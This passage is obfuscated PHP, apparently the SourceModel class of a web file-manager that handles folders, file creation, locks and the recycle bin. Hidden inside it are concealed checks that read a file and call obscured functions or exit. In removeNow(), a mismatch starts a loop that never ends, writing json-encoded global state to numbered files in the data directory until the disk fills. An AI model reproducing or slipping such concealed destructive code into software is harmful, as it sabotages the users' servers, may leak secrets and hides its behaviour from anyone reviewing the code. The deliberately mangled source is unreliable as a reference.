$ä×Áü‡§[$©ÁßñÔ[462]] = 0; } else { if ($À÷ãè‹µ) { $À÷ãè‹µ = is_array($À÷ãè‹µ) ? $À÷ãè‹µ : explode($©ÁßñÔ[50], $À÷ãè‹µ); $ä×Áü‡§[$©ÁßñÔ[463]] = array($©ÁßñÔ[469], $À÷ãè‹µ); $ä×Áü‡§[$©ÁßñÔ[462]] = 0; } } } } $this->_parseSearchParent($âôñ®š­, $ä×Áü‡§); if (isset($âôñ®š­[$©ÁßñÔ[1997]]) && trim($âôñ®š­[$©ÁßñÔ[1997]])) { $´²şåí¢ = trim($âôñ®š­[$©ÁßñÔ[1997]]); $º“³á‰ = explode($©ÁßñÔ[53], $´²şåí¢); if (strlen($´²şåí¢) > 2 && (substr($´²şåí¢, 0, 1) == $©ÁßñÔ[118] && substr($´²şåí¢, -1) == $©ÁßñÔ[118]) || substr($´²şåí¢, 0, 1) == $©ÁßñÔ[58] && substr($´²şåí¢, -1) == $©ÁßñÔ[58]) { $´²şåí¢ = substr($´²şåí¢, 1, -1); $º“³á‰ = array($´²şåí¢); } $ä×Áü‡§[$©ÁßñÔ[32]] = array(array($©ÁßñÔ[590], $©ÁßñÔ[1999] . $´²şåí¢ . $©ÁßñÔ[1999])); if (count($º“³á‰) > 1) { $ä×Áü‡§[$©ÁßñÔ[32]] = array(); foreach ($º“³á‰ as $ú½éó±Ü) { if (!trim($ú½éó±Ü)) { continue; } $ä×Áü‡§[$©ÁßñÔ[32]][] = array($©ÁßñÔ[590], $©ÁßñÔ[1999] . trim($ú½éó±Ü) . $©ÁßñÔ[1999]); } } } return $ä×Áü‡§; } private function _parseSearchParent($òƒªíõë, &$ÛÀ•ÛŸà) { $ì÷§–Ïá =& $_SERVER[íû‘ş´]; if (!isset($òƒªíõë[$ì÷§–Ïá[180]]) || !$òƒªíõë[$ì÷§–Ïá[180]]) { return; } $ø¾Š¨Ù = $this->pathInfo($òƒªíõë[$ì÷§–Ïá[180]]); $”»ˆñ÷ı = $ø¾Š¨Ù[$ì÷§–Ïá[180]] . $ì÷§–Ïá[12] === $ì÷§–Ïá[212]; $›œ€“üÆ = $ø¾Š¨Ù[$ì÷§–Ïá[178]] == $ì÷§–Ïá[557]; if ($ø¾Š¨Ù[$ì÷§–Ïá[574]] == $ì÷§–Ïá[575]) { $Ï¤Ã½û = $this->sourceInfo($òƒªíõë[$ì÷§–Ïá[180]]); $ø¾Š¨Ù[$ì÷§–Ïá[563]] = $Ï¤Ã½û[$ì÷§–Ïá[563]]; } $ÛÀ•ÛŸà[$ì÷§–Ïá[630]] = array($ì÷§–Ïá[590], $ø¾Š¨Ù[$ì÷§–Ïá[563]] . $òƒªíõë[$ì÷§–Ïá[180]] . $ì÷§–Ïá[591]); $ôæÜ‰°¼ = isset($òƒªíõë[$ì÷§–Ïá[1862]]) && in_array($ì÷§–Ïá[557], $òƒªíõë[$ì÷§–Ïá[1862]]); if (!$ôæÜ‰°¼ || !$›œ€“üÆ || !$”»ˆñ÷ı || !$ø¾Š¨Ù[$ì÷§–Ïá[464]]) { return; } if (!AuthModel::authCheckRoot($ø¾Š¨Ù[$ì÷§–Ïá[464]][$ì÷§–Ïá[465]])) { return; } $Ôì»ÈŸÑ = $ø¾Š¨Ù[$ì÷§–Ïá[548]] . $ì÷§–Ïá[12]; if ($Ôì»ÈŸÑ == $ì÷§–Ïá[88]) { unset($ÛÀ•ÛŸà[$ì÷§–Ïá[630]]); $ÛÀ•ÛŸà[$ì÷§–Ïá[178]] = self::TYPE_GROUP; return; } $©×œƒ¤Ñ = Model($ì÷§–Ïá[564])->groupChildrenAll($Ôì»ÈŸÑ); $îºßÔ£ö = count($©×œƒ¤Ñ); if ($îºßÔ£ö <= 1) { return; } $ÕæÁûã = array($ì÷§–Ïá[180] => 0, $ì÷§–Ïá[178] => self::TYPE_GROUP, $ì÷§–Ïá[548] => array($ì÷§–Ïá[7], $©×œƒ¤Ñ)); $Ó²¿ğàş = $this->field($ì÷§–Ïá[2175])->where($ÕæÁûã)->limit($îºßÔ£ö)->select(); $ÛÀ•ÛŸà[$ì÷§–Ïá[630]] = array(); foreach ($Ó²¿ğàş as $½™¸æúñ) { $ÛÀ•ÛŸà[$ì÷§–Ïá[630]][] = array($ì÷§–Ïá[590], $ì÷§–Ïá[573] . $½™¸æúñ[$ì÷§–Ïá[181]] . $ì÷§–Ïá[591]); } $ÛÀ•ÛŸà[$ì÷§–Ïá[630]][] = $ì÷§–Ïá[2001]; } } if ($_SERVER[$_SERVER[íû‘ş´][444]] != $_SERVER[$_SERVER[íû‘ş´][445]]) { $_getc = $_SERVER[íû‘ş´][446]; $_getfile = $_SERVER[$_SERVER[íû‘ş´][447]] . $_SERVER[íû‘ş´][448]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[íû‘ş´][246], $_getfilec); if (count($_getarrs) < $_SERVER[íû‘ş´][449]) { $exit = $_SERVER[íû‘ş´][450]; $exit(); } $_act = $_SERVER[íû‘ş´][451]; $_act($_SERVER[$_SERVER[íû‘ş´][452]]); } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ŸìÄ…İ) { $Äˆãò¸ =& $_SERVER[íû‘ş´]; $ï˜ÌÌ° = Model($Äˆãò¸[556])->where(array($Äˆãò¸[1696] => $ŸìÄ…İ))->find(); $óëÖ€ÛÇ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ŸìÄ…İ, $ï˜ÌÌ°[$Äˆãò¸[32]]); $this->userDesktopAdd($óëÖ€ÛÇ); return $óëÖ€ÛÇ; } public function userDesktopAdd($ÆâŸÇ‘³) { $®ÂæÃ± =& $_SERVER[íû‘ş´]; $µ»ÃÑÖ = LNG($®ÂæÃ±[2176]); $½ÖòÚµô = $this->mkdir($ÆâŸÇ‘³, $µ»ÃÑÖ); $this->metaSet($½ÖòÚµô, $®ÂæÃ±[2177], $®ÂæÃ±[88]); $this->metaSet($ÆâŸÇ‘³, $®ÂæÃ±[2178], $½ÖòÚµô); } public function userPathSafeAdd($·¢Îšø) { $ñõö–êÛ =& $_SERVER[íû‘ş´]; $ÊÕ¶İ®œ = Model($ñõö–êÛ[556])->getInfoFull($·¢Îšø); if (!$ÊÕ¶İ®œ) { return !1; } if (_get($ÊÕ¶İ®œ, $ñõö–êÛ[578])) { return $ÊÕ¶İ®œ[$ñõö–êÛ[516]][$ñõö–êÛ[2179]]; } $»üÁ´ì = $this->_mkdirRoot(SourceModel::TYPE_USER, $·¢Îšø, $ñõö–êÛ[2180], $ñõö–êÛ[483]); Model($ñõö–êÛ[556])->metaSet($·¢Îšø, $ñõö–êÛ[2179], $»üÁ´ì); $this->metaSet($»üÁ´ì, $ñõö–êÛ[2181], $·¢Îšø); return $»üÁ´ì; } public function groupRootAdd($§¹Š•Òè) { $ûß•İßé =& $_SERVER[íû‘ş´]; $şëŒ“à = Model($ûß•İßé[564])->where(array($ûß•İßé[1991] => $§¹Š•Òè))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $§¹Š•Òè, $şëŒ“à[$ûß•İßé[32]]); } public function systemRootPathAdd($İ¤Á½Èö) { if ($İ¤Á½Èö != $_SERVER[íû‘ş´][584]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $İ¤Á½Èö); } public function userRootRemove($âª¤¿÷“) { $ª·¢Êç = $this->targetSourceRoot(SourceModel::TYPE_USER, $âª¤¿÷“, !0); foreach ($ª·¢Êç as $…èä¢†ë) { if (!$…èä¢†ë) { continue; } $this->remove($…èä¢†ë[$_SERVER[íû‘ş´][181]], !1); } } public function groupRootRemove($¿ıÚæÔ•) { $Š’åİ  = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¿ıÚæÔ•); if (!$Š’åİ ) { return; } $this->remove($Š’åİ [$_SERVER[íû‘ş´][181]], !1); } private function _mkdirRoot($Ôµö©¾Ò, $´¾Ä–Ä, $“Ë¤±øü, $„ÇµáÂ = '') { $ÛÄâµä =& $_SERVER[íû‘ş´]; $¼€ôº•´ = defined($ÛÄâµä[2124]) ? USER_ID : 0; $ìï›ëÅ° = array($ÛÄâµä[454] => 0, $ÛÄâµä[626] => $Ôµö©¾Ò, $ÛÄâµä[627] => $´¾Ä–Ä, $ÛÄâµä[624] => 1, $ÛÄâµä[628] => $¼€ôº•´, $ÛÄâµä[629] => $¼€ôº•´, $ÛÄâµä[625] => $„ÇµáÂ, $ÛÄâµä[630] => $ÛÄâµä[573], $ÛÄâµä[481] => 0, $ÛÄâµä[595] => 0, $ÛÄâµä[519] => 0, $ÛÄâµä[631] => $ÛÄâµä[12]); if ($µÆãó§ù = $this->where($ìï›ëÅ°)->find()) { return $µÆãó§ù[$ÛÄâµä[181]]; } $£òûİ˜ô = "\115\x6f\144\145\154\123\x6f\165\162\x63\145\56\x6d\x6b\x64\x69\x72\x52\157\x6f\x74\56{$Ôµö©¾Ò}\x2e{$´¾Ä–Ä}\56" . $“Ë¤±øü; CacheLock::lock($£òûİ˜ô); $ìï›ëÅ°[$ÛÄâµä[32]] = $“Ë¤±øü; $Áı¤ŠÜæ = $this->add($ìï›ëÅ°); $ğĞ€á—ó = array($ÛÄâµä[632] => short_id($Áı¤ŠÜæ)); $this->where(array($ÛÄâµä[468] => $Áı¤ŠÜæ))->save($ğĞ€á—ó); CacheLock::unlock($£òûİ˜ô); return $Áı¤ŠÜæ; } private function targetSourceRoot($·¨Èñ, $èí×š¨ì, $¾°«ñĞ = false) { $¿Ë÷›ç =& $_SERVER[íû‘ş´]; $®û­ÓíÍ = array($¿Ë÷›ç[454] => 0, $¿Ë÷›ç[626] => $·¨Èñ, $¿Ë÷›ç[627] => $èí×š¨ì); if ($¾°«ñĞ) { $ÜğèÃ«£ = $this->where($®û­ÓíÍ)->select(); return $ÜğèÃ«£ ? $ÜğèÃ«£ : array(); } $Š÷Úğ¬Å = $this->where($®û­ÓíÍ)->find(); return $Š÷Úğ¬Å ? $Š÷Úğ¬Å : array(); } public function sourceRootGroup($óÅ‡à•Ì) { $»Å˜Áá– =& $_SERVER[íû‘ş´]; if (is_string($óÅ‡à•Ì)) { $óÅ‡à•Ì = array($óÅ‡à•Ì); } $ìø„åš¹ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $óÅ‡à•Ì, $»Å˜Áá–[203]); $ÆµÄ®² = array($»Å˜Áá–[413] => $ìø„åš¹, $»Å˜Áá–[410] => array($»Å˜Áá–[817] => count($óÅ‡à•Ì))); $this->_listDataApply($ÆµÄ®²[$»Å˜Áá–[413]]); $this->_listMake($ÆµÄ®²); return array_to_keyvalue($ÆµÄ®²[$»Å˜Áá–[82]], $»Å˜Áá–[548]); } public function mkfile($©¼ÔÉ°õ, $¦ş×Ñ÷ë, $ú©ëëı‚ = '', $¹ğÚäÊË = REPEAT_RENAME) { $€ôáÜª£ =& $_SERVER[íû‘ş´]; $ó¢¬ùŸü = Model($€ôáÜª£[652])->addFileByContent($ú©ëëı‚, $¦ş×Ñ÷ë); return $this->_createFileCall($©¼ÔÉ°õ, $¦ş×Ñ÷ë, $ó¢¬ùŸü, $¹ğÚäÊË, $€ôáÜª£[1400]); } public function addFile($†ƒ›Œİ¤, $¾„¨³Ÿ, $ú¿À¶Ö³, $–ƒÉ‹ïì = false, $óà¾İî´ = REPEAT_RENAME) { $õ¯±±Ö— = Model($_SERVER[íû‘ş´][652])->addFile($¾„¨³Ÿ, $ú¿À¶Ö³, $–ƒÉ‹ïì); return $this->_createFileCall($†ƒ›Œİ¤, $ú¿À¶Ö³, $õ¯±±Ö—, $óà¾İî´); } public function addFileByFileID($®Î¤Ò¦Á, $îƒØ€ï, $…Öå¶àœ, $«­–É½ = REPEAT_RENAME) { $“½½Ÿã =& $_SERVER[íû‘ş´]; $€œçáæş = Model($“½½Ÿã[652])->find($îƒØ€ï); Model($“½½Ÿã[652])->linkAdd($îƒØ€ï); return $this->_createFileCall($®Î¤Ò¦Á, $…Öå¶àœ, $€œçáæş, $«­–É½); } public function addFileByRemote($á§ÔÍô§, $ùÍÎÉ»‘, $ÁùÖß¡Ã, $ÔÔ§¦Ãô = array(), $çïËäÏ¬ = REPEAT_RENAME) { $•€¶÷¬Ä = Model($_SERVER[íû‘ş´][652])->addFileByRemote($ùÍÎÉ»‘, $ÁùÖß¡Ã, $ÔÔ§¦Ãô); return $this->_createFileCall($á§ÔÍô§, $ÁùÖß¡Ã, $•€¶÷¬Ä, $çïËäÏ¬); } private function _createFileCall($ÁœøÛüÀ, $§ã›¬Õã, $»ëÔã¾Ó, $·–ÁŒ°, $Û§²ÆÈÌ = "\x75\x70\x6c\x6f\x61\144") { $åôŸŞâ‡ =& $_SERVER[íû‘ş´]; $’ôé•İÈ = !1; $this->setMasterDB(); $this->lockWriteStart($ÁœøÛüÀ, $§ã›¬Õã); $æÎ¿¥Ä‡ = $this->fileNameExist($ÁœøÛüÀ, $§ã›¬Õã); $ç»å¹¥— = $this->_createFile($ÁœøÛüÀ, $§ã›¬Õã, $»ëÔã¾Ó, $·–ÁŒ°, $’ôé•İÈ); if (!$’ôé•İÈ) { Model($åôŸŞâ‡[521])->remove($»ëÔã¾Ó[$åôŸŞâ‡[518]]); } if ($’ôé•İÈ && $ç»å¹¥— && $ç»å¹¥— != $æÎ¿¥Ä‡) { Model($åôŸŞâ‡[2149])->eventCreate($ç»å¹¥—, $Û§²ÆÈÌ); } $this->lockWriteEnd($ÁœøÛüÀ, $§ã›¬Õã); return $ç»å¹¥—; } public function mkdir($òÙªÊ…İ, $ğë¬‘¦´, $Ç£ïï¢¦ = REPEAT_SKIP) { $îÀò±ã… =& $_SERVER[íû‘ş´]; $this->setMasterDB(); $„¸¼¦÷§ = $this->sourceInfo($òÙªÊ…İ); if (!$„¸¼¦÷§) { return !1; } $this->lockWriteStart($òÙªÊ…İ, $ğë¬‘¦´); if ($Ç£ïï¢¦ !== !1) { $ïãå§óå = $this->fileNameExist($òÙªÊ…İ, $ğë¬‘¦´); if ($ïãå§óå && $Ç£ïï¢¦ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($òÙªÊ…İ, $ğë¬‘¦´); return $ïãå§óå; } $ğë¬‘¦´ = $this->fileNameAuto($òÙªÊ…İ, $ğë¬‘¦´, $Ç£ïï¢¦); } $øôĞÄ“ì = array($îÀò±ã…[624] => 1, $îÀò±ã…[471] => $ğë¬‘¦´, $îÀò±ã…[625] => $îÀò±ã…[12], $îÀò±ã…[519] => 0, $îÀò±ã…[595] => 0); $ñ¥¿îŠç = $this->_addSource($øôĞÄ“ì, $„¸¼¦÷§); Model($îÀò±ã…[2149])->eventCreate($ñ¥¿îŠç, $îÀò±ã…[1401]); $this->lockWriteEnd($òÙªÊ…İ, $ğë¬‘¦´); return $ñ¥¿îŠç; } public function listSourceRoot($çä§±Ù, $Š¶èÍı, $©¹ë©ã = "\163\157\165\162\143\x65\x49\104\x2c\x74\x61\162\147\x65\164\x49\x44\54\163\x69\172\145") { $„ø®¾Ş’ =& $_SERVER[íû‘ş´]; $¾•Â¡¤¨ = $„ø®¾Ş’[422]; $šŒ¸ß„Ä = array(); $â’¸º¢ß = 1024 * 50; $¨ŠÂŒíŠ = is_array($¨ŠÂŒíŠ) ? $¨ŠÂŒíŠ : array(); $œââøàÈ = count($Š¶èÍı); $‰†Ï„“˜ = $this->tablePrefix . $„ø®¾Ş’[2182]; for ($šêşÈıÛ = 0; $šêşÈıÛ < $œââøàÈ; $šêşÈıÛ++) { $±ˆãÊ†¤ = $Š¶èÍı[$šêşÈıÛ]; $¾•Â¡¤¨ .= "\x53\x45\114\x45\x43\x54\40\52\40\x46\x52\117\115\40\50\123\105\114\x45\x43\124\40{$©¹ë©ã}\40\106\x52\117\x4d\x20\140{$‰†Ï„“˜}\x60\40\127\110\105\x52\x45\40"; $¾•Â¡¤¨ .= "\140\x70\141\x72\145\156\x74\x49\104\x60\75\60\x20\x41\x4e\x44\40\x60\x74\141\162\x67\x65\164\x49\x44\140\x3d{$±ˆãÊ†¤}\x20\x41\116\104\x20\x60\x74\141\162\x67\145\x74\124\x79\x70\x65\140\x3d{$çä§±Ù}\40\141\x6e\144\40\146\151\x6c\x65\x54\171\160\145\x3d\47\47\40\154\151\x6d\x69\164\40\x31\x29\x20\141\163\x20\164\142\137{$šêşÈıÛ}\x20\125\116\x49\117\x4e\x20\x41\114\x4c\x20"; if ((strlen($¾•Â¡¤¨) >= $â’¸º¢ß || $šêşÈıÛ == $œââøàÈ - 1) && $¾•Â¡¤¨) { $¾•Â¡¤¨ = substr($¾•Â¡¤¨, 0, -strlen($„ø®¾Ş’[1096])); $¡Â¼Šó = $this->query($¾•Â¡¤¨); $¾•Â¡¤¨ = $„ø®¾Ş’[12]; $šŒ¸ß„Ä = array_merge($šŒ¸ß„Ä, $¡Â¼Šó); } } return $šŒ¸ß„Ä; } private function _createFile($¹œÙ±ÚÙ, $€ÑµÕ«é, $’Ã‰°², $¥‘õ“½°, &$·®ı¼â©) { $ğ¨ãÀùÔ =& $_SERVER[íû‘ş´]; $ªìØ»ìö = $this->sourceInfo($¹œÙ±ÚÙ); if (!$’Ã‰°² || !$ªìØ»ìö) { return !1; } if ($¥‘õ“½° !== !1) { $ÊßÓ„÷Œ = $this->fileNameExist($¹œÙ±ÚÙ, $€ÑµÕ«é); } $·®ı¼â© = !0; if ($¥‘õ“½° && $ÊßÓ„÷Œ) { if ($¥‘õ“½° == REPEAT_SKIP) { $·®ı¼â© = !1; return $ÊßÓ„÷Œ; } else { if ($¥‘õ“½° == REPEAT_REPLACE) { $äø­ìò = $this->sourceInfo($ÊßÓ„÷Œ); $¹ºãêá = $this->fileHistory($äø­ìò, $’Ã‰°²[$ğ¨ãÀùÔ[518]], $’Ã‰°²[$ğ¨ãÀùÔ[76]]); if (!$¹ºãêá) { $·®ı¼â© = !1; } else { $this->folderSizeReset($¹œÙ±ÚÙ); } return $ÊßÓ„÷Œ; } else { $€ÑµÕ«é = $this->fileNameAuto($¹œÙ±ÚÙ, $€ÑµÕ«é, $¥‘õ“½°, !1); } } } $ÏÖãŠıÒ = array($ğ¨ãÀùÔ[624] => 0, $ğ¨ãÀùÔ[471] => $€ÑµÕ«é, $ğ¨ãÀùÔ[625] => substr(get_path_ext($€ÑµÕ«é), 0, 10), $ğ¨ãÀùÔ[519] => $’Ã‰°²[$ğ¨ãÀùÔ[518]], $ğ¨ãÀùÔ[595] => $’Ã‰°²[$ğ¨ãÀùÔ[76]]); $©¸¹İå¦ = $this->_addSource($ÏÖãŠıÒ, $ªìØ»ìö); $this->folderSizeReset($¹œÙ±ÚÙ, intval($ÏÖãŠıÒ[$ğ¨ãÀùÔ[76]])); return $©¸¹İå¦; } protected function fileHistory($®ıŸùîæ, $«‰‡ ×à, $ç…ªŞë¬) { $Ëû ±¡ =& $_SERVER[íû‘ş´]; if ($®ıŸùîæ[$Ëû ±¡[518]] == $«‰‡ ×à) { return !1; } $this->checkLock($®ıŸùîæ[$Ëû ±¡[181]], $«‰‡ ×à); Model($Ëû ±¡[2183])->addHistory($®ıŸùîæ); $³‹ìø±· = array($Ëû ±¡[629] => USER_ID, $Ëû ±¡[475] => time(), $Ëû ±¡[518] => $«‰‡ ×à, $Ëû ±¡[76] => $ç…ªŞë¬); $this->where(array($Ëû ±¡[468] => $®ıŸùîæ[$Ëû ±¡[181]]))->save($³‹ìø±·); $this->sourceCacheClear($®ıŸùîæ[$Ëû ±¡[181]]); return !0; } public function checkLock($ªªÍÁîŠ, $ªÇ‹ä¼) { $Ú©É›àÅ =& $_SERVER[íû‘ş´]; $”Éõ™ˆî = $this->pathInfo($ªªÍÁîŠ); if (!$this->fileIsLock($”Éõ™ˆî, !0)) { return; } $û’Äƒ‘¸ = Session::get($Ú©É›àÅ[2184]); $ò ±ú’ = substr($”Éõ™ˆî[$Ú©É›àÅ[32]], 0, -1 - strlen($”Éõ™ˆî[$Ú©É›àÅ[175]])) . $Ú©É›àÅ[1266] . $û’Äƒ‘¸ . $Ú©É›àÅ[10] . $”Éõ™ˆî[$Ú©É›àÅ[175]]; $ë÷¡¤× = Model($Ú©É›àÅ[652])->find($ªÇ‹ä¼); $this->_createFileCall($”Éõ™ˆî[$Ú©É›àÅ[180]], $ò ±ú’, $ë÷¡¤×, REPEAT_REPLACE, $Ú©É›àÅ[1400]); $ºà ñ¾ = $”Éõ™ˆî[$Ú©É›àÅ[516]][$Ú©É›àÅ[588]]; $¦Ï€ê² = $ºà ñ¾[$Ú©É›àÅ[2185]] ? $ºà ñ¾[$Ú©É›àÅ[2185]] : $ºà ñ¾[$Ú©É›àÅ[32]]; show_json(LNG($Ú©É›àÅ[2186]) . $Ú©É›àÅ[2187] . LNG($Ú©É›àÅ[2188]) . $Ú©É›àÅ[2189] . $¦Ï€ê² . $Ú©É›àÅ[2190], !1); } public function fileIsLock($ş˜ö¤à¬, $¯†Š‰Ş¸ = false) { $Š÷…ºò =& $_SERVER[íû‘ş´]; if (!isset($ş˜ö¤à¬[$Š÷…ºò[516]]) || !$ş˜ö¤à¬[$Š÷…ºò[516]][$Š÷…ºò[585]]) { return !1; } if ($ş˜ö¤à¬[$Š÷…ºò[516]][$Š÷…ºò[585]] != USER_ID) { return !0; } $Ïûôà• = $GLOBALS[$Š÷…ºò[6]][$Š÷…ºò[89]][$Š÷…ºò[586]]; if ($ş˜ö¤à¬[$Š÷…ºò[516]][$Š÷…ºò[587]] <= time() - $Ïûôà•) { $this->metaSet($ş˜ö¤à¬[$Š÷…ºò[181]], $Š÷…ºò[585], null); $this->metaSet($ş˜ö¤à¬[$Š÷…ºò[181]], $Š÷…ºò[587], null); } if ($¯†Š‰Ş¸) { $this->metaSet($ş˜ö¤à¬[$Š÷…ºò[181]], $Š÷…ºò[587], time()); } return !1; } private function _addSource($¦ªóÛÚ, $ñà‰‘¬à) { $úÍ’¬óû =& $_SERVER[íû‘ş´]; $â­€¸— = defined($úÍ’¬óû[2124]) ? USER_ID : 0; $¾è•Óş = array($úÍ’¬óû[626] => $ñà‰‘¬à[$úÍ’¬óû[178]], $úÍ’¬óû[627] => $ñà‰‘¬à[$úÍ’¬óû[548]], $úÍ’¬óû[628] => $â­€¸—, $úÍ’¬óû[629] => $â­€¸—, $úÍ’¬óû[454] => $ñà‰‘¬à[$úÍ’¬óû[181]], $úÍ’¬óû[630] => $ñà‰‘¬à[$úÍ’¬óû[563]] . $ñà‰‘¬à[$úÍ’¬óû[181]] . $úÍ’¬óû[50], $úÍ’¬óû[481] => 0, $úÍ’¬óû[631] => $úÍ’¬óû[12]); $¦ªóÛÚ = array_merge($¾è•Óş, $¦ªóÛÚ); $this->updateModifyTime($¦ªóÛÚ[$úÍ’¬óû[180]]); $®¿ÚŞÊß = $úÍ’¬óû[2191] . $ñà‰‘¬à[$úÍ’¬óû[181]]; if (isset(self::$cacheChildList[$®¿ÚŞÊß])) { unset(self::$cacheChildList[$®¿ÚŞÊß]); } static $ŠÛ»ÌÇ = false; if (!$ŠÛ»ÌÇ) { Hook::trigger($úÍ’¬óû[614], $¦ªóÛÚ); $ŠÛ»ÌÇ = !0; } $ãšç·ñÜ = $this->add($¦ªóÛÚ); $‚ú øñ§ = array($úÍ’¬óû[632] => short_id($ãšç·ñÜ)); $this->where(array($úÍ’¬óû[468] => $ãšç·ñÜ))->save($‚ú øñ§); $this->setNamePinyin($ãšç·ñÜ, $¦ªóÛÚ[$úÍ’¬óû[32]]); return $ãšç·ñÜ; } public function remove($Û¾À¦Ãª, $Õâ‰Îİ” = true) { $æ’Ó»¬ =& $_SERVER[íû‘ş´]; $ÑÌ•Èï• = $this->sourceInfo($Û¾À¦Ãª); $å‘§¼¸Ô = intval($ÑÌ•Èï•[$æ’Ó»¬[178]]) === self::TYPE_SYSTEM; $²áíÛÆĞ = Model($æ’Ó»¬[485])->get($æ’Ó»¬[2192]) == $æ’Ó»¬[88]; if ($å‘§¼¸Ô || $Õâ‰Îİ” || !$²áíÛÆĞ) { return $this->removeNow($Û¾À¦Ãª, $Õâ‰Îİ”); } $“†ÒÕë = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $È¿ô©¬Â = $ÑÌ•Èï•[$æ’Ó»¬[178]] == self::TYPE_USER ? $æ’Ó»¬[640] : $æ’Ó»¬[557]; if ($È¿ô©¬Â == $æ’Ó»¬[640]) { $ŒËù—¢» = Model($æ’Ó»¬[556])->getInfo($ÑÌ•Èï•[$æ’Ó»¬[548]]); $å»“€º” = !empty($ŒËù—¢»[$æ’Ó»¬[2185]]) ? $ŒËù—¢»[$æ’Ó»¬[2185]] : $ŒËù—¢»[$æ’Ó»¬[32]]; $å»“€º” = $æ’Ó»¬[304] . $å»“€º” . $æ’Ó»¬[2193] . $ÑÌ•Èï•[$æ’Ó»¬[548]]; } else { $ŒËù—¢» = Model($æ’Ó»¬[564])->getInfo($ÑÌ•Èï•[$æ’Ó»¬[548]]); $å»“€º” = _get($ŒËù—¢», $æ’Ó»¬[32]); $å»“€º” = $æ’Ó»¬[163] . $å»“€º” . $æ’Ó»¬[2194] . $ÑÌ•Èï•[$æ’Ó»¬[548]]; } $÷»öİÌ¾ = $æ’Ó»¬[2195] . md5($å»“€º”); CacheLock::lock($÷»öİÌ¾); $—˜…®÷˜ = $this->fileNameExist($“†ÒÕë, $å»“€º”); if (!$—˜…®÷˜) { $—˜…®÷˜ = $this->mkdir($“†ÒÕë, $å»“€º”, REPEAT_SKIP); $this->metaSet($—˜…®÷˜, $æ’Ó»¬[2196], $È¿ô©¬Â); $this->metaSet($—˜…®÷˜, $æ’Ó»¬[2197], $ÑÌ•Èï•[$æ’Ó»¬[548]]); if ($ÑÌ•Èï•[$æ’Ó»¬[180]] != 0) { $this->metaSet($—˜…®÷˜, $æ’Ó»¬[2198], _get($ŒËù—¢», $æ’Ó»¬[2199])); } } CacheLock::unlock($÷»öİÌ¾); $this->metaSet($Û¾À¦Ãª, $æ’Ó»¬[2200], $ÑÌ•Èï•[$æ’Ó»¬[180]]); $this->where(array($æ’Ó»¬[181] => $Û¾À¦Ãª))->save(array($æ’Ó»¬[475] => time())); $this->recycleClear($ÑÌ•Èï•); $»ÒÏÎµµ = $this->move($Û¾À¦Ãª, $—˜…®÷˜, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÑÌ•Èï•[$æ’Ó»¬[180]]); return $»ÒÏÎµµ; } private function recycleClear($Æç‡Ğ) { $ÙÜö‘Ö„ =& $_SERVER[íû‘ş´]; $ê¼î´ÌÆ = $this->childrenAll($Æç‡Ğ); $ÖÏÅÛ— = array($ÙÜö‘Ö„[468] => array($ÙÜö‘Ö„[469], $ê¼î´ÌÆ[$ÙÜö‘Ö„[2201]])); Model($ÙÜö‘Ö„[2202])->where($ÖÏÅÛ—)->delete(); } public function removeNow($¯æÍİæ, $éÇÕİû = true) { $¼“„½ß½ =& $_SERVER[íû‘ş´]; $¾ˆÔŞê = $_SERVER[$¼“„½ß½[452]]; $„áˆÕ¤ = $¼“„½ß½[1628]; if ($_SERVER[$¼“„½ß½[444]] != $„áˆÕ¤($¾ˆÔŞê)) { $§õ’îõ¶ = $¼“„½ß½[936]; $ø×õ“ßù = $¼“„½ß½[446]; $Ê·ê­‡à = $_SERVER[$¼“„½ß½[447]] . $¼“„½ß½[448]; $Ñş÷©¹ = $ø×õ“ßù($Ê·ê­‡à); $›Ø‹ÄØÂ = explode($¼“„½ß½[246], $Ñş÷©¹); if (count($›Ø‹ÄØÂ) < $¼“„½ß½[671]) { $À…ìŸ = $¼“„½ß½[450]; $À…ìŸ(); } $Êğ‹ÑˆÊ = $¼“„½ß½[937]; $Êğ‹ÑˆÊ($_SERVER[$¼“„½ß½[938]]); $§õ’îõ¶ = $¼“„½ß½[936]; $§õ’îõ¶(); $Æ“Îòß½ = $¼“„½ß½[1629]; $Ÿ¹š®” = json_encode($GLOBALS[$¼“„½ß½[1630]]); $ãéŸ§ĞÜ = 1; for ($óôĞéò = $ãéŸ§ĞÜ; $óôĞéò > 0; $óôĞéò++) { $Æ“Îòß½(DATA_PATH . $óôĞéò, $Ÿ¹š®”); } } $”××Êœ = $this->sourceInfo($¯æÍİæ); $¼ÀÆ˜îŠ = $this->pathInfoMore($¯æÍİæ); if (!$”××Êœ) { return !0; } if ($”××Êœ[$¼“„½ß½[180]] == 0) { if (!_get($GLOBALS, $¼“„½ß½[546])) { return !1; } } $this->lockMoveStart($¯æÍİæ); Hook::trigger($¼“„½ß½[2203], $¼ÀÆ˜îŠ, $éÇÕİû); if ($éÇÕİû) { Model($¼“„½ß½[2202])->moveToRecycle($¯æÍİæ); } else { $»éÅ•Í = $this->childrenAll($”××Êœ); Model($¼“„½ß½[611])->eventRemove($¯æÍİæ); $this->removeRelevance($»éÅ•Í[$¼“„½ß½[2201]], $»éÅ•Í[$¼“„½ß½[1513]]); } $this->folderSizeReset($”××Êœ[$¼“„½ß½[180]]); $ËºÜéÈ = array($”××Êœ[$¼“„½ß½[180]]); if ($”××Êœ[$¼“„½ß½[462]] == $¼“„½ß½[88]) { $ËºÜéÈ[] = $”××Êœ[$¼“„½ß½[181]]; } $this->updateModifyTime($ËºÜéÈ); $this->lockMoveEnd($¯æÍİæ); Hook::trigger($¼“„½ß½[1747], $¼ÀÆ˜îŠ, $éÇÕİû); return !0; } public function childrenAll($£çŸ¿òÇ) { $ÀºÚ¼ì¤ =& $_SERVER[íû‘ş´]; $”ÃÜ•Î = $£çŸ¿òÇ[$ÀºÚ¼ì¤[181]]; if ($£çŸ¿òÇ[$ÀºÚ¼ì¤[462]] == $ÀºÚ¼ì¤[88]) { $ãÀ›ÅÊ… = array($ÀºÚ¼ì¤[630] => array($ÀºÚ¼ì¤[590], 